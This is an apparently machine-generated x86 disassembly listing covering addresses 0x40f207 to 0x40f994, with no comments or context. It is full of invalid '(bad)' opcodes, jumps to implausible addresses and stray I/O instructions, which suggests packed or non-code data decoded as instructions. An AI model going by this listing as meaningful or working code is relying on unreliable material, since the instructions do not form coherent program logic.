  40f207:	inc    esp
  40f208:	shl    BYTE PTR [eax-0x7ef897fe],1
  40f20e:	inc    ebx
  40f20f:	add    cl,cl
  40f211:	fild   WORD PTR [edx]
  40f213:	add    BYTE PTR [ecx+0x590857eb],dh
  40f219:	pushf  
  40f21a:	(bad)  
  40f21c:	inc    esi
  40f21d:	ins    DWORD PTR es:[edi],dx
  40f21e:	mov    dh,dh
  40f220:	aas    
  40f221:	ret    
  40f222:	fisttp QWORD PTR [edi+0x49]
  40f225:	and    BYTE PTR [ebp+0x0],0x0
  40f229:	xor    DWORD PTR [ebx+0x1526fc57],edx
  40f22f:	or     al,0xe8
  40f231:	xchg   esi,eax
  40f232:	sbb    edi,ebx
  40f234:	(bad)  
  40f235:	call   0x6440f8d9
  40f23a:	push   edi
  40f23b:	out    dx,eax
  40f23c:	sub    ch,0x75
  40f23f:	fdiv   st(6),st
  40f241:	inc    BYTE PTR [edi]
  40f243:	add    al,0x6a
  40f245:	dec    edi
  40f246:	mov    edx,DWORD PTR [edi+0x8]
  40f249:	(bad)  
  40f24b:	pop    ebx
  40f24c:	jmp    esi
  40f24e:	push   0xecf6fc48
  40f253:	pop    edi
  40f254:	pusha  
  40f255:	jo     0x40f239
  40f257:	add    al,BYTE PTR [eax]
  40f259:	xor    edx,esp
  40f25b:	pop    DWORD PTR [esi+edi*4+0x61fede3b]
  40f262:	retf   0x106
  40f265:	xor    edx,esp
  40f267:	jmp    0xda68:0x2e21671
  40f26e:	rol    BYTE PTR [ebx+0x0],0x9
  40f272:	and    DWORD PTR [ebx+0x41],0x3d910931
  40f279:	adc    BYTE PTR [edx-0x17],cl
  40f27c:	fidivr WORD PTR ds:0x3144a09b
  40f282:	aam    0x93
  40f284:	or     ecx,DWORD PTR [ecx+0x6fde045f]
  40f28a:	pusha  
  40f28b:	push   edx
  40f28c:	fs add al,dh
  40f28f:	or     BYTE PTR [ecx-0x16b62e5c],al
  40f295:	imul   esi,edi,0x69
  40f298:	sub    BYTE PTR [ecx+ebx*8],al
  40f29b:	push   es
  40f29c:	jmp    0x5c14a3a4
  40f2a1:	or     al,0x49
  40f2a3:	inc    ebx
  40f2a4:	int3   
  40f2a5:	fnsave [edi]
  40f2a7:	test   DWORD PTR [ebx-0x2b],ebp
  40f2aa:	sub    al,0xd3
  40f2ac:	mov    ebp,0x4def1934
  40f2b1:	add    al,0x31
  40f2b3:	shl    BYTE PTR [ebx],cl
  40f2b5:	loopne 0x40f2ce
  40f2b7:	pop    ebp
  40f2b8:	icebp  
  40f2b9:	jmp    0x40f2a9
  40f2bb:	push   ecx
  40f2bc:	sahf   
  40f2bd:	(bad)  
  40f2bf:	(bad)  
  40f2c0:	in     al,dx
  40f2c1:	add    esp,DWORD PTR [esi+edi*2+0x7c]
  40f2c5:	xor    edx,0xffffffdd
  40f2c8:	xchg   ch,bl
  40f2ca:	out    dx,eax
  40f2cb:	pop    edi
  40f2cc:	jmp    0xfc13013a
  40f2d1:	or     ecx,ecx
  40f2d3:	mov    al,dh
  40f2d5:	(bad)  
  40f2d7:	sub    BYTE PTR [ebx-0x23f30821],0x63
  40f2de:	jo     0x40f2e9
  40f2e0:	jmp    0x5c4a23e8
  40f2e5:	xchg   DWORD PTR [edi-0x122ba2d],edi
  40f2eb:	pusha  
  40f2ec:	in     eax,0x2
  40f2ee:	xor    DWORD PTR [ecx],ecx
  40f2f0:	add    BYTE PTR [ecx+0x0],al
  40f2f3:	mov    BYTE PTR [eax+eax*1-0x17],ch
  40f2f7:	or     cl,ah
  40f2f9:	pusha  
  40f2fa:	test   al,0x32
  40f2fc:	popa   
  40f2fd:	mov    edi,0x6808f388
  40f302:	mov    bh,0x13
  40f304:	dec    eax
  40f305:	add    BYTE PTR [esi],cl
  40f307:	push   ds
  40f308:	fwait
  40f309:	inc    edi
  40f30a:	test   al,0x32
  40f30c:	shl    BYTE PTR [ecx+esi*8+0x5a],cl
  40f310:	out    0xfb,al
  40f312:	idiv   BYTE PTR [ebp+0x6a]
  40f315:	lds    ecx,FWORD PTR [eax-0x5997f70d]
  40f31b:	rol    DWORD PTR [edi+0x0],cl
  40f31e:	push   ecx
  40f31f:	pop    es
  40f320:	push   0x6cae941
  40f325:	add    cl,ch
  40f327:	mov    dl,0xd3
  40f329:	je     0x40f31c
  40f32b:	sbb    cl,dl
  40f32d:	sti    
  40f32e:	mov    esi,0xbe848505
  40f333:	cld    
  40f334:	sar    dh,cl
  40f336:	sbb    DWORD PTR ds:0x32e96576,eax
  40f33c:	shl    BYTE PTR [ebp+ebx*4-0x1b],cl
  40f340:	pop    esp
  40f341:	or     BYTE PTR [ecx-0x7100aec5],al
  40f347:	jmp    0x40f310
  40f349:	add    ebp,ecx
  40f34b:	daa    
  40f34c:	jle    0x40f339
  40f34e:	push   0x76fdd5ee
  40f353:	std    
  40f354:	pop    edi
  40f355:	add    BYTE PTR [ebx],al
  40f357:	add    BYTE PTR ds:0xdaf174d2,al
  40f35d:	iret   
  40f35e:	jbe    0x40f3be
  40f360:	in     eax,0x80
  40f362:	inc    esp
  40f363:	push   ebp
  40f364:	cmc    
  40f365:	or     al,0x7d
  40f367:	leave  
  40f368:	jae    0x40f373
  40f36a:	add    BYTE PTR [eax],al
  40f36c:	cwde   
  40f36d:	add    eax,0xbd0d8d00
  40f372:	cld    
  40f373:	jmp    DWORD PTR [edi+0x16]
  40f376:	push   0x58904
  40f37b:	call   0x415f3c
  40f380:	mov    al,ds:0x88415f92
  40f385:	pop    ebp
  40f386:	aad    0x61
  40f388:	leave  
  40f389:	add    eax,0x46b95e68
  40f38e:	add    bh,bh
  40f390:	popf   
  40f391:	jnp    0x40f3d9
  40f393:	inc    ecx
  40f394:	dec    eax
  40f395:	mov    ah,0x73
  40f397:	or     BYTE PTR [eax],dh
  40f399:	adc    edi,esp
  40f39b:	call   DWORD PTR [edi+0x64]
  40f39e:	frstor [ecx+0x19]
  40f3a1:	or     eax,0x4be9d568
  40f3a6:	add    BYTE PTR [eax+0x6],ch
  40f3a9:	ins    BYTE PTR es:[edi],dx
  40f3aa:	inc    ecx
  40f3ab:	add    BYTE PTR [eax-0x67fffff9],al
  40f3b1:	mov    ah,0x73
  40f3b3:	or     al,dh
  40f3b5:	inc    esi
  40f3b6:	cld    
  40f3b7:	inc    edi
  40f3b9:	add    BYTE PTR [ebx-0x4b29ff09],0xfd
  40f3c0:	push   eax
  40f3c1:	mov    al,ds:0x8006602
  40f3c6:	mov    ah,0x73
  40f3c8:	cld    
  40f3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3ca:	cmp    cl,BYTE PTR [eax]
  40f3cc:	call   0x40309b
  40f3d1:	mov    eax,ds:0x3d0002c7
  40f3d6:	sub    dl,0x83
  40f3d9:	mov    WORD PTR [ecx+0x1de20068],?
  40f3df:	push   DWORD PTR [ebp-0x40]
  40f3e2:	in     al,0x74
  40f3e4:	ja     0x40f417
  40f3e6:	aaa    
  40f3e7:	fisttp DWORD PTR [eax+0x6e3e6c]
  40f3ed:	sbb    esp,esp
  40f3ef:	fs inc ecx
  40f3f1:	xor    DWORD PTR [edx-0x1e0f9f2e],edi
  40f3f7:	fnstenv [edi+ebx*8]
  40f3fa:	stos   BYTE PTR es:[edi],al
  40f3fb:	inc    ebx
  40f3fc:	add    BYTE PTR [ecx-0x7900a81a],bl
  40f402:	fcmovnb st,st(2)
  40f404:	jae    0x40f41e
  40f406:	xchg   edx,eax
  40f407:	push   0x0
  40f409:	xor    edi,ecx
  40f40b:	cwde   
  40f40c:	addr16 inc ebx
  40f40e:	test   BYTE PTR [ebx+0x0],al
  40f411:	add    edi,ecx
  40f413:	dec    edi
  40f414:	or     BYTE PTR [ecx-0x28],cl
  40f417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f418:	(bad)  
  40f419:	push   esi
  40f41a:	or     al,BYTE PTR [ebx]
  40f41c:	jp     0x40f46c
  40f41e:	out    0x6c,eax
  40f420:	add    BYTE PTR [eax],al
  40f422:	(bad)  
  40f424:	fs inc ecx
  40f426:	xor    DWORD PTR [edx-0x2c],ecx
  40f429:	pusha  
  40f42a:	lock loope 0x40f406
  40f42d:	xor    al,0xe7
  40f42f:	sbb    DWORD PTR [ebp+0x0],eax
  40f432:	sbb    edx,ebx
  40f434:	push   edi
  40f435:	call   FWORD PTR [esi]
  40f437:	jmp    0x40f3fb
  40f439:	jae    0x40f473
  40f43b:	repnz imul eax,DWORD PTR [eax],0x31
  40f43f:	ja     0x40f3d9
  40f441:	and    eax,DWORD PTR [si]
  40f444:	inc    ebp
  40f445:	add    BYTE PTR [ecx+0x77],ah
  40f448:	dec    edi
  40f449:	or     BYTE PTR [ecx],cl
  40f44b:	lods   al,BYTE PTR ds:[esi]
  40f44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f44d:	(bad)  
  40f44e:	out    dx,al
  40f44f:	jns    0x40f406
  40f451:	js     0x40f439
  40f453:	dec    esi
  40f454:	fidiv  DWORD PTR [ebp+ebx*8+0x56]
  40f458:	push   eax
  40f459:	or     cl,cl
  40f45b:	daa    
  40f45c:	push   ebx
  40f45d:	dec    esi
  40f45f:	or     BYTE PTR [eax],dh
  40f461:	lds    esi,FWORD PTR [edx]
  40f463:	or     DWORD PTR [esi+ecx*4-0x28d37436],esi
  40f46a:	pop    esp
  40f46b:	cmp    bl,al
  40f46d:	add    ebx,DWORD PTR [ebx]
  40f46f:	and    eax,DWORD PTR [esi+0x50]
  40f472:	cmp    ecx,esp
  40f474:	push   eax
  40f475:	push   ecx
  40f476:	sahf   
  40f477:	iret   
  40f478:	pop    edi
  40f479:	inc    eax
  40f47a:	xchg   ebp,eax
  40f47b:	(bad)  
  40f47c:	jmp    0x268e816c
  40f481:	fidivr DWORD PTR [ebx]
  40f483:	leave  
  40f484:	xchg   esp,eax
  40f485:	cld    
  40f486:	add    dh,ch
  40f488:	pusha  
  40f489:	jmp    0x80cf7a91
  40f48e:	cli    
  40f48f:	ror    BYTE PTR [ecx-0x17],1
  40f492:	xor    esp,DWORD PTR [esi+0x55]
  40f495:	icebp  
  40f496:	jmp    0x40f476
  40f498:	stos   BYTE PTR es:[edi],al
  40f499:	cmc    
  40f49a:	(bad)  [esi-0x7f]
  40f49d:	outs   dx,DWORD PTR ds:[esi]
  40f49e:	fimul  DWORD PTR [edi-0x7d]
  40f4a1:	sbb    ebx,DWORD PTR [esi]
  40f4a3:	stc    
  40f4a4:	dec    ecx
  40f4a5:	jmp    0x214ff236
  40f4aa:	inc    ebx
  40f4ab:	xor    DWORD PTR [ecx+0x44a5040d],ecx
  40f4b1:	push   ecx
  40f4b2:	sub    BYTE PTR [ebx+0x930e948],dl
  40f4b8:	jmp    0x271f908
  40f4bd:	test   eax,0x91372e50
  40f4c2:	(bad)  
  40f4c4:	into   
  40f4c5:	popf   
  40f4c6:	xor    al,0x89
  40f4c8:	or     ecx,ebp
  40f4ca:	call   0x662f5683
  40f4cf:	jo     0x40f4da
  40f4d1:	sbb    ecx,ebx
  40f4d3:	pop    ebp
  40f4d4:	add    DWORD PTR [ecx-0x316cbd],edx
  40f4da:	jne    0x40f4a1
  40f4dc:	inc    eax
  40f4dd:	jns    0x40f54d
  40f4df:	call   0xb2eff5c7
  40f4e4:	or     al,0x0
  40f4e6:	aam    0xdc
  40f4e8:	inc    esp
  40f4e9:	cld    
  40f4ea:	sbb    al,BYTE PTR [eax]
  40f4ec:	in     eax,dx
  40f4ed:	xchg   ecx,eax
  40f4ee:	dec    BYTE PTR [esi-0x78]
  40f4f1:	iret   
  40f4f2:	icebp  
  40f4f3:	xchg   edi,eax
  40f4f4:	inc    ebp
  40f4f5:	push   es
  40f4f6:	jne    0x40f47a
  40f4f8:	js     0x40f54f
  40f4fa:	cld    
  40f4fb:	ss out 0x0,al
  40f4fe:	call   0xff0ed88a
  40f503:	(bad)  
  40f504:	dec    eax
  40f505:	rol    cl,0xe5
  40f508:	xor    dh,BYTE PTR [ebx+ecx*4]
  40f50b:	add    eax,0xb7fbcaac
  40f510:	and    DWORD PTR [ebx+0x0],esp
  40f513:	xchg   ebx,eax
  40f514:	adc    eax,0x4af174ce
  40f519:	inc    esp
  40f51a:	jbe    0x40f512
  40f51c:	jns    0x40f49f
  40f51e:	inc    esp
  40f51f:	in     eax,dx
  40f520:	mov    ebp,0xf2313a15
  40f525:	or     BYTE PTR [ebx+0x41411b1c],cl
  40f52b:	jmp    0x554104e2
  40f530:	outs   dx,BYTE PTR ds:[esi]
  40f531:	popa   
  40f532:	aas    
  40f533:	dec    ebx
  40f534:	jb     0x40f53f
  40f536:	push   edi
  40f537:	rcl    DWORD PTR [ebp+0x25e90064],1
  40f53d:	leave  
  40f53e:	jae    0x40f50e
  40f540:	inc    eax
  40f541:	loope  0x40f4f9
  40f543:	imul   ebp,ecx,0xffffffce
  40f546:	dec    edi
  40f547:	adc    DWORD PTR ds:0x8a57ef09,esi
  40f54d:	sbb    BYTE PTR [edx+0x28],ah
  40f550:	add    BYTE PTR ds:0xe500ff39,dh
  40f556:	add    eax,ebp
  40f558:	ret    
  40f559:	imul   esi,DWORD PTR [ecx+0x318ce8fd],0xab3ffff
  40f563:	inc    esi
  40f564:	or     BYTE PTR [esi],0x5
  40f567:	jne    0x40f563
  40f569:	xchg   esi,eax
  40f56a:	mov    ch,0x31
  40f56c:	shl    BYTE PTR [ecx-0x250],0xb3
  40f573:	lods   al,BYTE PTR ds:[esi]
  40f574:	cmp    BYTE PTR [edi-0x1a0044c2],dl
  40f57a:	mov    ch,0xfd
  40f57c:	jne    0x40f50e
  40f57e:	loope  0x40f5a6
  40f580:	jbe    0x40f5e1
  40f582:	mov    cl,0x5d
  40f584:	pop    esi
  40f585:	inc    ecx
  40f586:	les    eax,FWORD PTR [edx]
  40f588:	add    ch,al
  40f58a:	jl     0x40f576
  40f58c:	add    DWORD PTR [esi+esi*4+0x68],0x0
  40f591:	mov    dl,0x25
  40f593:	push   DWORD PTR [ebp+0x60]
  40f596:	loope  0x40f560
  40f598:	jne    0x40f5f9
  40f59a:	mov    ch,0x87
  40f59c:	inc    ebp
  40f59d:	pop    esp
  40f59e:	pop    esp
  40f59f:	add    BYTE PTR [edx+0x58],ch
  40f5a2:	popa   
  40f5a3:	dec    edi
  40f5a4:	bound  ebx,QWORD PTR [ecx]
  40f5a6:	add    eax,0x9480068
  40f5ab:	sub    al,0xb4
  40f5ae:	xor    edi,edi
  40f5b0:	call   DWORD PTR [ebx]
  40f5b2:	leave  
  40f5b3:	jb     0x40f5d4
  40f5b5:	add    BYTE PTR [eax-0x23],cl
  40f5b8:	inc    edx
  40f5b9:	sbb    bh,0xb4
  40f5bc:	dec    esi
  40f5bd:	push   0xbeef0908
  40f5c2:	jo     0x40f5cf
  40f5c4:	bound  eax,QWORD PTR [ecx+0x18]
  40f5c7:	sbb    edi,edi
  40f5c9:	jne    0x40f5cb
  40f5cb:	loope  0x40f61b
  40f5cd:	mov    eax,ds:0xe7d67331
  40f5d2:	mov    dl,bh
  40f5d4:	(bad)  
  40f5d5:	(bad)  
  40f5d6:	out    0xcd,al
  40f5d8:	(bad)  
  40f5d9:	(bad)  
  40f5da:	fs (bad) 
  40f5dd:	retf   
  40f5de:	pop    esp
  40f5df:	push   ebx
  40f5e0:	xlat   BYTE PTR ds:[ebx]
  40f5e1:	enter  0xe6f3,0x2
  40f5e5:	push   ebp
  40f5e6:	mov    edx,0xbdc38336
  40f5eb:	mov    eax,0x33046a02
  40f5f0:	push   ecx
  40f5f1:	or     BYTE PTR [ecx-0x5900b04e],bl
  40f5f7:	pop    ecx
  40f5f8:	inc    ecx
  40f5f9:	cld    
  40f5fa:	or     edx,esp
  40f5fc:	add    ch,bh
  40f5fe:	xlat   BYTE PTR ds:[ebx]
  40f5ff:	retf   0x6189
  40f602:	lock loope 0x40f66f
  40f605:	xchg   edi,eax
  40f606:	adc    esp,DWORD PTR [ecx-0x25fb00fe]
  40f60c:	jmp    0xe4fe:0xd6f3d05a
  40f613:	std    
  40f614:	(bad)  
  40f615:	je     0x40f650
  40f617:	cli    
  40f618:	je     0x40f68e
  40f61a:	add    BYTE PTR [esi-0x35],bl
  40f61d:	retf   
  40f61e:	shr    DWORD PTR ds:0x5d8b2fe2,0x5f
  40f625:	sar    bl,0xdb
  40f628:	loope  0x40f692
  40f62a:	cs ds xor eax,0x2cfce80c
  40f631:	xlat   BYTE PTR ds:[ebx]
  40f632:	(bad)  
  40f633:	mov    eax,0x3167d824
  40f638:	loop   0x40f61f
  40f63a:	mov    ebp,0x41608089
  40f63f:	xor    DWORD PTR [edx-0x71],ecx
  40f642:	popa   
  40f643:	jo     0x40f627
  40f645:	aad    0x74
  40f647:	cmp    DWORD PTR [ecx],ecx
  40f649:	xchg   ecx,eax
  40f64a:	and    edx,eax
  40f64c:	retf   
  40f64d:	popf   
  40f64e:	imul   esi,DWORD PTR [ecx],0x9
  40f651:	xchg   BYTE PTR [ebp+0x450a9e56],dl
  40f657:	xor    DWORD PTR [ecx+0x3e],esp
  40f65a:	popa   
  40f65b:	jo     0x40f666
  40f65d:	jle    0x40f6af
  40f65f:	sub    ecx,esp
  40f661:	fbld   TBYTE PTR [edi+ecx*8-0x3aaf9235]
  40f668:	retf   
  40f669:	fisttp DWORD PTR [ebx]
  40f66b:	leave  
  40f66c:	or     edx,esp
  40f66e:	(bad)  
  40f66f:	mov    bh,0xc1
  40f671:	sub    bh,bh
  40f673:	scas   al,BYTE PTR es:[edi]
  40f674:	xor    al,0x62
  40f676:	out    0xb3,eax
  40f678:	les    eax,FWORD PTR [edx+ecx*4+0x5]
  40f67c:	stc    
  40f67d:	jno    0x40f670
  40f67f:	add    BYTE PTR [eax],cl
  40f681:	or     DWORD PTR [eax+eax*2-0x73],esp
  40f685:	cmp    BYTE PTR [esi],ch
  40f687:	push   eax
  40f688:	cmp    DWORD PTR [edi-0x17],ebx
  40f68b:	(bad)  
  40f68c:	add    eax,0x15311df9
  40f691:	xchg   BYTE PTR [eax],ch
  40f693:	push   eax
  40f694:	push   ss
  40f695:	xor    BYTE PTR [ebx-0x16a14929],0x69
  40f69c:	xor    DWORD PTR [ecx-0x2],esp
  40f69f:	add    DWORD PTR [ecx],esi
  40f6a1:	or     esi,esi
  40f6a3:	dec    edi
  40f6a4:	cmp    eax,0xc0d5ee5f
  40f6a9:	add    al,0x53
  40f6ab:	add    al,0xcb
  40f6ad:	or     cl,dl
  40f6af:	mov    ebp,0x73e908d0
  40f6b4:	das    
  40f6b5:	push   ebp
  40f6b6:	int    0xec
  40f6b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b9:	jmpw   0xdec0
  40f6bd:	(bad)  
  40f6be:	in     al,dx
  40f6bf:	add    edi,DWORD PTR [esi+edi*2-0x1]
  40f6c3:	les    esi,FWORD PTR [eax+0x5662fbc6]
  40f6c9:	cmc    
  40f6ca:	mov    bh,bl
  40f6cc:	mov    BYTE PTR [ecx],cl
  40f6ce:	lea    esp,[ecx+ebx*8]
  40f6d1:	cmp    bh,bh
  40f6d3:	sbb    al,0x39
  40f6d5:	retf   0xe174
  40f6d8:	pop    eax
  40f6d9:	or     edi,edi
  40f6db:	cld    
  40f6dc:	into   
  40f6dd:	retf   
  40f6de:	push   ecx
  40f6df:	rcl    DWORD PTR [edi-0x76],1
  40f6e2:	je     0x40f6b2
  40f6e4:	add    BYTE PTR [ecx+0x5b59fc35],bh
  40f6ea:	or     DWORD PTR [edx-0x17],ebp
  40f6ed:	dec    edx
  40f6ee:	retf   0xe902
  40f6f1:	xor    cl,dl
  40f6f3:	je     0x40f6ee
  40f6f5:	sbb    dl,cl
  40f6f7:	(bad)  
  40f6f8:	(bad)  [esi+0x32d30060]
  40f6fe:	loope  0x40f778
  40f700:	retf   
  40f701:	xor    cl,BYTE PTR [ecx]
  40f703:	nop
  40f704:	ss dec ah
  40f707:	out    0xf9,eax
  40f709:	adc    DWORD PTR [ecx],ecx
  40f70b:	add    BYTE PTR [eax],dh
  40f70d:	jae    0x40f709
  40f70f:	push   DWORD PTR [ebx+0x2d82dea9]
  40f715:	int    0x33
  40f717:	or     DWORD PTR [edx+ebp*2+0x25ec73ca],0xffffffc0
  40f71f:	rcl    ebp,0x32
  40f722:	jle    0x40f778
  40f724:	fnstsw WORD PTR [ecx-0x555b7308]
  40f72a:	cmp    ch,BYTE PTR [edx-0x17]
  40f72d:	gs push ebp
  40f72f:	or     al,0xde
  40f731:	out    0x0,eax
  40f733:	push   0xffffffe9
  40f735:	add    eax,0x60ce1455
  40f73a:	xor    eax,0x3ac80085
  40f73f:	push   edx
  40f740:	(bad)  
  40f741:	dec    ebp
  40f742:	jno    0x40f742
  40f744:	call   FWORD PTR [eax]
  40f746:	push   es
  40f747:	mov    edx,DWORD PTR [ebp+0x0]
  40f74a:	add    BYTE PTR [ecx+0x714d8d10],0x4e
  40f751:	lea    ecx,[ebp-0x3b]
  40f754:	dec    esi
  40f755:	push   0xffffffe8
  40f757:	mov    ah,0x73
  40f759:	mov    eax,0x830c17b7
  40f75e:	xor    eax,0xed73fe71
  40f763:	cmp    BYTE PTR [ebx-0x40],0x47
  40f767:	cmp    edx,DWORD PTR [edi+edi*8]
  40f76a:	mov    ebp,0x5737fdd5
  40f76f:	cmp    ecx,DWORD PTR [edi+edi*8]
  40f772:	(bad)  
  40f774:	(bad)  
  40f775:	push   ebp
  40f776:	mov    al,ds:0x58e835b4
  40f77b:	push   0x8d0b0000
  40f780:	add    bh,bh
  40f782:	lds    esi,FWORD PTR [ecx+0x73]
  40f785:	loopne 0x40f77a
  40f787:	outs   dx,BYTE PTR ds:[esi]
  40f788:	mov    DWORD PTR [ebp+0x0],edx
  40f78b:	adc    DWORD PTR [eax],0xfd6d9dff
  40f791:	push   edx
  40f792:	adc    BYTE PTR [ecx+ecx*8],0xc2
  40f796:	ins    BYTE PTR es:[edi],dx
  40f797:	add    eax,0x87648b55
  40f79c:	ret    0x36f8
  40f79f:	mov    ch,0xfd
  40f7a1:	push   edi
  40f7a2:	jecxz  0x40f7be
  40f7a4:	adc    BYTE PTR [ebx-0x77c7d96],cl
  40f7aa:	push   esi
  40f7ab:	mov    ch,0xfd
  40f7ad:	push   eax
  40f7ae:	add    dl,ah
  40f7b0:	add    al,0xff
  40f7b2:	jne    0x40f7f4
  40f7b4:	sub    eax,DWORD PTR [eax]
  40f7b6:	push   DWORD PTR [ecx]
  40f7b8:	gs hlt 
  40f7ba:	inc    BYTE PTR [ebx-0x5b4076ea]
  40f7c0:	pop    esp
  40f7c1:	retf   
  40f7c2:	test   BYTE PTR ds:0x31fed289,dl
  40f7c8:	mov    dl,0x2
  40f7ca:	add    BYTE PTR [edx-0x10233a3],bh
  40f7d0:	outs   dx,DWORD PTR ds:[esi]
  40f7d1:	jle    0x40f7e4
  40f7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7d4:	sub    eax,0x9feefdd0
  40f7d9:	xor    ecx,DWORD PTR [ebp-0x12e4d54]
  40f7df:	fisub  WORD PTR [edx]
  40f7e1:	pop    esi
  40f7e2:	adc    dh,dl
  40f7e4:	std    
  40f7e5:	retf   
  40f7e6:	std    
  40f7e7:	into   
  40f7e8:	aas    
  40f7e9:	rcl    DWORD PTR [ecx+0x35],cl
  40f7ec:	xor    edx,DWORD PTR [ecx-0x2cd04005]
  40f7f2:	inc    DWORD PTR [edx+0xd]
  40f7f5:	cmp    DWORD PTR [ecx+esi*1-0x59012ca1],0x24fef6dd
  40f800:	loop   0x40f7d3
  40f802:	je     0x40f829
  40f804:	lahf   
  40f805:	shl    DWORD PTR [ecx+edi*1+0x4a],1
  40f809:	or     edi,edi
  40f80b:	xchg   bh,dh
  40f80d:	xchg   dh,al
  40f80f:	and    edi,ebp
  40f811:	cmp    bl,0x0
  40f814:	ja     0x40f83d
  40f816:	shl    DWORD PTR [edx+edx*2+0xb],cl
  40f81a:	stos   DWORD PTR es:[edi],eax
  40f81b:	mov    bh,BYTE PTR [edx+ebx*1+0x3b5efed2]
  40f822:	idiv   dh
  40f824:	pushf  
  40f825:	or     dl,dl
  40f827:	dec    BYTE PTR [esi-0x41]
  40f82a:	xor    al,0x8
  40f82c:	out    0xe8,al
  40f82e:	lds    ecx,FWORD PTR [edi]
  40f830:	xor    DWORD PTR [ecx],ecx
  40f832:	cmp    al,0x7f
  40f834:	dec    edx
  40f835:	mov    ah,BYTE PTR [ebx+ecx*8+0x3ad5c82c]
  40f83c:	mov    edx,0x407edd5d
  40f841:	xchg   esi,eax
  40f842:	imul   ecx,ebx,0x14
  40f845:	enter  0x33bd,0x9b
  40f849:	or     DWORD PTR [ebx+0x4],eax
  40f84c:	push   es
  40f84d:	ds fst st(2)
  40f850:	pusha  
  40f851:	add    DWORD PTR [ebx+eax*8+0x7d],ebp
  40f855:	sub    esp,DWORD PTR [esi-0x16f712b8]
  40f85b:	add    esi,DWORD PTR [ecx]
  40f85d:	cdq    
  40f85e:	popa   
  40f85f:	js     0x40f847
  40f861:	mov    BYTE PTR [ebp+0x6c1aabd2],0x48
  40f868:	int    0x58
  40f86a:	fs mov dl,cl
  40f86d:	(bad)  
  40f86e:	ins    DWORD PTR es:[edi],dx
  40f86f:	shr    BYTE PTR [esi+0x33],cl
  40f872:	stc    
  40f873:	sar    BYTE PTR [ebp-0x40],cl
  40f876:	pop    esi
  40f877:	rol    BYTE PTR [eax],cl
  40f879:	scas   eax,DWORD PTR es:[edi]
  40f87a:	(bad)  
  40f87b:	mov    edx,0xcb8bb6ff
  40f880:	iret   
  40f881:	sahf   
  40f882:	xchg   edi,eax
  40f883:	mov    esp,0x3c85a426
  40f888:	ror    DWORD PTR [edi-0x22da739],1
  40f88e:	sbb    BYTE PTR [esi],ch
  40f890:	pop    eax
  40f891:	sub    eax,0xdffb9bc8
  40f896:	mov    al,0xea
  40f898:	shr    BYTE PTR [edi-0x39],cl
  40f89b:	imul   ecx,edx,0x400d9936
  40f8a1:	pop    ebp
  40f8a2:	cwde   
  40f8a3:	jnp    0x40f88e
  40f8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a6:	mov    bl,0x4d
  40f8a8:	jle    0x40f84f
  40f8aa:	sar    bh,0xf6
  40f8ad:	pusha  
  40f8ae:	(bad)  
  40f8af:	mov    bl,bl
  40f8b1:	arpl   WORD PTR [edi+esi*8-0x19],di
  40f8b5:	pusha  
  40f8b6:	(bad)  
  40f8b7:	(bad)  
  40f8b8:	cmp    ebp,DWORD PTR ds:0x31abc968
  40f8be:	or     DWORD PTR [ebp+0x62],edx
  40f8c1:	adc    eax,ecx
  40f8c3:	je     0x40f8b6
  40f8c5:	add    DWORD PTR [esi],edi
  40f8c7:	sbb    cl,dl
  40f8c9:	push   ebp
  40f8ca:	cmp    edi,edi
  40f8cc:	mov    dh,0xe0
  40f8ce:	cmp    eax,0x281ec10c
  40f8d3:	add    cl,ch
  40f8d5:	ret    
  40f8d6:	out    0x82,al
  40f8d8:	test   eax,0x1cff5937
  40f8dd:	add    BYTE PTR [ecx],dh
  40f8df:	(bad)  
  40f8e0:	je     0x40f8d3
  40f8e2:	cli    
  40f8e3:	add    eax,0xc8008672
  40f8e8:	je     0x40f8bf
  40f8ea:	loope  0x40f929
  40f8ec:	adc    BYTE PTR [esi+0x5e],dh
  40f8ef:	and    eax,ebp
  40f8f1:	mov    esi,0x30fec664
  40f8f6:	out    dx,eax
  40f8f7:	sbb    al,BYTE PTR [eax]
  40f8f9:	mov    ah,0x2d
  40f8fb:	mov    dl,0xfe
  40f8fd:	fsubr  QWORD PTR [edx+0x7af174c7]
  40f903:	scas   eax,DWORD PTR es:[edi]
  40f904:	jo     0x40f94c
  40f906:	add    bh,0x74
  40f909:	in     eax,dx
  40f90a:	push   0xa
  40f90c:	pusha  
  40f90d:	jmp    0x2e914244
  40f912:	out    0x14,al
  40f914:	call   FWORD PTR [edx+ecx*4-0x7e64f852]
  40f91b:	(bad)  
  40f91c:	(bad)  
  40f91d:	pushf  
  40f91e:	pop    esi
  40f91f:	(bad)  
  40f920:	je     0x40f91b
  40f922:	cmp    DWORD PTR ds:0xd7400018,0x834fff6f
  40f92c:	rcl    BYTE PTR [eax+ebx*2],0xff
  40f930:	mov    ch,ah
  40f932:	leave  
  40f933:	rcl    dl,1
  40f935:	test   DWORD PTR [edi-0x27],0x463075fd
  40f93c:	test   BYTE PTR [eax],al
  40f93e:	cld    
  40f93f:	fdivr  st,st(5)
  40f941:	push   eax
  40f942:	add    bh,ch
  40f944:	pop    esi
  40f945:	or     al,ch
  40f947:	pop    ss
  40f948:	xlat   BYTE PTR ds:[ebx]
  40f949:	std    
  40f94a:	jmp    DWORD PTR [edx+0xd]
  40f94d:	push   0x0
  40f94f:	jo     0x40f929
  40f951:	add    DWORD PTR [eax],eax
  40f953:	or     BYTE PTR [edi-0x7c],al
  40f956:	add    al,dl
  40f958:	fdivr  st,st(5)
  40f95a:	push   eax
  40f95b:	inc    edx
  40f95c:	fdivr  st,st(5)
  40f95e:	jne    0x40f948
  40f960:	arpl   WORD PTR [eax],ax
  40f962:	push   0xffffffc8
  40f964:	loope  0x40f982
  40f966:	pusha  
  40f967:	enter  0xc709,0x85
  40f96b:	dec    eax
  40f96c:	loope  0x40f96b
  40f96e:	(bad)  
  40f96f:	call   0x9740f97d
  40f974:	mov    ?,edx
  40f976:	test   DWORD PTR [edi-0x27],0x9980000
  40f97d:	mov    DWORD PTR [ebp-0x21f00],0x988
  40f987:	inc    edi
  40f988:	(bad)  
  40f989:	cli    
  40f98a:	test   DWORD PTR [edi-0x27],0x998fffe
  40f991:	mov    edx,DWORD PTR [ebp+0x60]
  40f994:	inc    esp
